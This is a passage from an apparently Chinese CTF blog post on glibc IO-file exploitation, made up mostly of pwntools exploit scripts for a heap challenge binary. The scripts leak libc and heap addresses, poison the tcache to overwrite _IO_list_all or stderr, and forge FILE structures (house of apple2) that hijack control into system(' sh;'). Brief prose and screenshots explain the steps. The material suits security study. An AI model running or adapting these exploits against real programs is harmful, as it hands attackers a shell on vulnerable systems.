<span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">idx? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">idx? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">commend</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">idx? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
    <span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">content :</span><span class="sh">'</span><span class="p">,</span><span class="n">commend</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">)</span>


<span class="nf">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x500</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>

<span class="nf">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">content : </span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">()</span> <span class="o">-</span> <span class="mh">0x21ace0</span>
<span class="n">main_arena</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x21ac80</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">main_arena</span><span class="sh">'</span><span class="p">,</span><span class="n">main_arena</span><span class="p">)</span>


<span class="nf">add</span><span class="p">(</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0x500</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c1">#产生tcache bin0
</span><span class="nf">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c1">#产生tcache bin1
#可以得到 tcache bin1 -&gt; fd =  tcache bin0
</span><span class="nf">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">content : </span><span class="sh">'</span><span class="p">)</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">heap_base</span><span class="sh">'</span><span class="p">,</span><span class="n">heap_base</span><span class="p">)</span>

<span class="n">key</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span>
<span class="n">_IO_list_all</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_list_all</span><span class="sh">'</span><span class="p">]</span>

<span class="nf">debug</span><span class="p">()</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">_IO_list_all</span> <span class="o">^</span> <span class="n">key</span><span class="p">))</span>
<span class="c1">#修改后：可以得到 tcache bin1 -&gt; fd =  (_IO_list_all ^ key)，经过malloc后返回的就是_IO_list_all的地址
</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span> <span class="c1">#申请的tcache bin1
</span><span class="nf">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span> <span class="c1">#申请的fake_chunk(_IO_list_all的位置)
</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">)</span>

<span class="n">fake_IO_1_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mi">2080</span>  <span class="c1">#即是fake_IO_file的地址
</span><span class="n">fake_IO_2_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mi">6192</span>  <span class="c1">#即是pad3的地址
</span><span class="n">fake_IO_3_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mi">10304</span> <span class="c1">#既是pad4的地址
</span><span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="n">_IO_wfile_jumps</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_wfile_jumps</span><span class="sh">'</span><span class="p">]</span>

<span class="n">fake_IO_file</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="n">fake_IO_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s"> sh;</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x1101</span><span class="p">)</span>
<span class="n">fake_IO_file</span> <span class="o">=</span> <span class="n">fake_IO_file</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_file</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># _IO_write_ptr
</span><span class="n">fake_IO_file</span> <span class="o">=</span> <span class="n">fake_IO_file</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_file</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_IO_2_addr</span><span class="p">)</span>  <span class="c1"># _wide_data = fake_IO_2_addr  
</span><span class="n">fake_IO_file</span> <span class="o">=</span> <span class="n">fake_IO_file</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xd8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_file</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">_IO_wfile_jumps</span><span class="p">)</span> <span class="c1"># vtable = IO_wfile_jumps
</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="n">fake_IO_file</span><span class="p">)</span> 

<span class="n">pad3</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="n">pad3</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">28</span>
<span class="n">pad3</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_IO_3_addr</span><span class="p">)</span> <span class="c1">#vtable
</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="n">pad3</span><span class="p">)</span>

<span class="n">pad4</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="n">pad4</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">13</span>
<span class="n">pad4</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span>  <span class="c1">#chain
</span><span class="nf">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">pad4</span><span class="p">)</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">fake_IO_1_addr</span><span class="p">))</span>  <span class="c1">#触发tcache poisoning，直接修改_IO_list_all的内容
</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">fake_IO_1_addr</span><span class="sh">'</span><span class="p">,</span><span class="n">fake_IO_1_addr</span><span class="p">)</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">fake_IO_2_addr</span><span class="sh">'</span><span class="p">,</span><span class="n">fake_IO_2_addr</span><span class="p">)</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">fake_IO_3_addr</span><span class="sh">'</span><span class="p">,</span><span class="n">fake_IO_3_addr</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>
<span class="nf">exit</span><span class="p">()</span>

<span class="nf">inter</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="方法2house-of-apple2tcachebin-attack">方法2：house of apple2+tcachebin attack</h5>

<p>tcache bin的fd指针修改</p>

<p>修改前</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20251010194702632.png" alt="image-20251010194702632" /></p>

<p>修改后</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20251010194826347.png" alt="image-20251010194826347" /></p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20251010194956958.png" alt="image-20251010194956958" /></p>

<p>由于我们修改了tcachebin1的fd指针，导致我们第二次申请的同样大小的堆块时，会直接申请的是返回_IO_2_1_stderr的地址，这导致我们可以直接修改__IO_2_1_stderr所在的内容，就可以触发tcache poisoning</p>

<p>写入fake_IO_file结构体前：</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20251010195446567.png" alt="image-20251010195446567" /></p>

<p>写入后：</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20251010195541013.png" alt="image-20251010195541013" /></p>

<p>这里需要解释一下wide_data为什么存放的是stderr-0x40的地址，因为wide_data的地址加上0x68就是我们可以直接控制的rip的地址，可以执行onegadget，magic，system函数等等</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pwn</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./heap</span><span class="sh">'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc.so.6</span><span class="sh">'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="sh">'</span><span class="s">REMOTE</span><span class="sh">'</span><span class="p">]:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">192.168.18.22</span><span class="sh">'</span><span class="p">,</span> <span class="mi">8888</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">pwn</span><span class="p">)</span>

<span class="nf">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#context.terminal = ['tmux','splitw','-h']
</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">pwn</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
<span class="n">inter</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

<span class="n">l32</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xf7</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">l64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu32_hex</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64_hex</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">uuu64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uuuu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">target</span><span class="p">:</span> <span class="nf">u64</span><span class="p">((</span><span class="nf">ru</span><span class="p">(</span><span class="n">target</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">:]</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">5</span><span class="p">)).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>

<span class="n">int16</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="s">%s -&gt; 0x%x</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_sb</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_orw</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">open</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">breakpoints</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">breakpoints</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">__call_tls_dtors</span><span class="sh">"</span><span class="p">]</span>
    <span class="k">elif</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
        <span class="n">breakpoints</span> <span class="o">=</span> <span class="p">[</span><span class="n">breakpoints</span><span class="p">]</span>
    <span class="n">script</span> <span class="o">=</span> <span class="sh">""</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">b </span><span class="si">{</span><span class="n">bp</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span>
    <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="nf">pidof</span><span class="p">(</span><span class="n">io</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="n">script</span><span class="p">)</span>
    <span class="nf">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">fmt</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mi">14</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="sh">'</span><span class="s">hhn</span><span class="sh">'</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">hhn</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
    <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">hn</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
    <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">n</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">%</span><span class="si">{</span><span class="n">num</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="c1">#value 是格式化字符串偏移          
</span>    <span class="k">return</span> <span class="n">payload</span>

<span class="n">lss</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">cat_flag</span><span class="p">():</span>
    <span class="n">flag_header</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">flag{</span><span class="sh">'</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="n">flag_header</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">flag_header</span> <span class="o">+</span> <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span>
    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1">#asm(shellcraft.sh()).ljust(0x108,b'a')
</span>
<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">idx? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">size? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">idx? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
